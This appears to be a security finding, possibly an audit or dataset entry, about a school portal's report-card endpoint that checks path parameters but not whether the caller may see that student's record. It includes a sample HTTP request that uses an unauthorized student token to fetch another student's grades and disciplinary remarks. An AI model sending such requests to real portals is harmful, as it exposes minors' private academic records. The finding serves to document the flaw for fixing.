diagnosis: The student report card endpoint validates path parameters through express-openapi-validator, but never verifies whether the authenticated caller is the student, their guardian, or an assigned faculty teacher. Any student or parent on the portal can view academic grades and disciplinary remarks for any other student.
exploit_request:
GET /api/v1/schools/sch_district_12/students/std_88921/report-card HTTP/1.1
Host: portal.district.edu:5008
Authorization: Bearer <unauthorized_student_token>
Accept: application/json
